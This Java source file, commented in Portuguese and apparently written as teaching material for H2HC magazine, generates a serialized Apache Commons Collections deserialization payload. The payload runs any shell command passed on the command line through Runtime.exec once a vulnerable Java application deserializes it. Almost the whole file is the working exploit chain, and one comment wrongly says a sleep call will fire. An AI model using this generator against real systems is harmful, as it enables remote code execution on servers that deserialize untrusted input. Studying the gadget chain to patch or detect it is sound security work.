import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.*;

/**
 * Gera payload que leva a execução de código durante a desserialização.
 * São usados os gadgets LayzMap, InvokerTransformer, ConstantTransformer e
 * ChainedTransformer, da commons-collections e a AnnotationInvocationHandler,
 * do JRE, como trigger gadget.
 * Note que esse exemplo (que usa a AnnotationInvocationHandler como trigger)
 * deverá funcionar em sistemas com JRE < 8u72. Em sistemas com versões superiores,
 * deve-se usar outro gadget como trigger, a exemplo do BadAttributeValueExpException
 * ou um HashMap + TiedMapEntry, propostos por Matthias Kaiser.
 *
 * -----------------------------------------------------------------------
 * * Mais detalhes na 12a edição da H2HC (hackers to hackers) magazine:
 * * https://www.h2hc.com.br/revista/
 * -----------------------------------------------------------------------
 *
 * OBS: Esse código tem fins apenas didáticos. Algumas cadeias de
 * transformers são baseadas nas versões de Chris Frohoff e/ou Matthias Kaiser
 *
 **** USAGE ****
 *
 * Compilando:
 * $ javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1.java
 *
 * Executando
 * $ java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1 'touch /tmp/h2hc_2017'
 *
 * @author @joaomatosf
 */
public class ExampleCommonsCollections1 {
    @SuppressWarnings ( {"unchecked"} )
    public static void main(String[] args)
            throws ClassNotFoundException, NoSuchMethodException, InstantiationException,
            IllegalAccessException, IllegalArgumentException, InvocationTargetException, IOException {

        // Verifica se o usuário forneceu o comando a ser executado
        if (args.length != 1) {
            System.out.println("Invalid params! \n" +
                    "Example usage: java ExampleCommonsCollections1 \"touch /tmp/test\"");
            System.exit(1);
        }

        // Seleciona o interpretador correto de acordo com o comando a ser executado
        //boolean isUnix = System.getProperty("file.separator").equals("/");
        boolean isUnix = !args[0].contains("cmd.exe") && !args[0].contains("powershell.exe");
        String cmd[];
        if (isUnix)
            cmd = new String[]{"/bin/bash", "-c", args[0]}; // Comando a ser executado
        else
            cmd = new String[]{"cmd.exe", "/c", args[0]}; // Comando a ser executado

        // Cria array de transformers que resulta na seguinte construção:
        //((Runtime)Runtime.class.getMethod("getRuntime", new Class[0]).invoke(null, new Object[0])).exec(cmd[]);
        Transformer[] transformers = new Transformer[] {
            // retorna Class Runtime.class
            new ConstantTransformer(Runtime.class),
            // 1o. Objeto InvokerTransformer: .getMethod("getRuntime", new Class[0])
            new InvokerTransformer(
                "getMethod",                       // invoca método getMethod
                ( new Class[] {String.class, Class[].class } ),// tipos dos parâmetros: (String, Class[])
                ( new Object[] {"getRuntime", new Class[0] } ) // parâmetros: (getRuntime, Class[0])
            ),
            // 2o. Objeto InvokerTransformer: .invoke(null, new Object[0])
            new InvokerTransformer(
                "invoke",                         // invoca método: invoke
                (new Class[] {Object.class, Object[].class }),// tipos dos parâmetros: (Object.class, Object[])
                (new Object[] {null, new Object[0] })         // parâmetros: (null, new Object[0])
            ),
            // 3o. Objeto InvokerTransformer: .exec(cmd[])
            new InvokerTransformer(
                "exec",                          // invoca método: exec
                new Class[] { String[].class },              // tipos dos parâmetros: (String[])
                new Object[]{ cmd } )                        // parâmetros: (cmd[])
        };

        // Cria o objeto ChainedTransformer com o array de Transformers:
        Transformer transformerChain = new ChainedTransformer(transformers);
        // Cria o map
        Map map = new HashMap();
        // Decora o map com o LazyMap e a cadeia de transformações como factory
        Map lazyMap = LazyMap.decorate(map,transformerChain);

        // Usa reflexão para obter referencia da classe AnnotationInvocationHandler
        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        // Obtem construtor da AnnotationInvocationHandler que recebe um tipo (class) e um Map
        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        // Torna o construtor acessível
        ctor.setAccessible(true);
        // Obtem/Cria instancia do AnnotationInvocationHandler, fornecendo (via construtor) um Retetion.class (que eh um
        // type Annotation, requerido pelo construtor) e atribui o LazyMap (contendo a cadeia de Transformers) ao campo
        // memberValues. Assim, ao tentar obter uma chave inexiste deste campo, a cadeia será "executada"!
        InvocationHandler handlerLazyMap = (InvocationHandler) ctor.newInstance(Retention.class, lazyMap);

        //cria a interface map
        Class[] interfaces = new Class[] {java.util.Map.class};
        // cria o Proxy "entre" a interface Map e o AnnotationInvocationHandler anterior (que contém o lazymap+transformers)
        Map proxyMap = (Map) Proxy.newProxyInstance(null, interfaces, handlerLazyMap);

        // cria outro AnnotationInvocationHandler atribui o Proxy ao campo memberValues
        // esse Proxy será "acionado" no magic method readObject e, assim, desviará o fluxo para o
        // método invoke() do primeiro AnnotationInvocationHandler criado (que contém o LazyMap+Transformers)
        InvocationHandler handlerProxy = (InvocationHandler) ctor.newInstance(Retention.class, proxyMap);

        // Serializa o objeto "handlerProxy" e o salva em arquivo. Ao ser desserializado,
        // o readObject irá executar um map.entrySet() e, assim, desviar o fluxo para o invoke().
        // No invoke(), uma chave inexistente será buscada no campo "memberValues" (que contém um LazyMap
        // com a cadeia de Transformers), o que deverá acionar o Thread.sleep(10000)!
        System.out.println("Saving serialized object in ExampleCommonsCollections1.ser");
        FileOutputStream fos = new FileOutputStream("ExampleCommonsCollections1.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(handlerProxy);
        oos.flush();

    }
}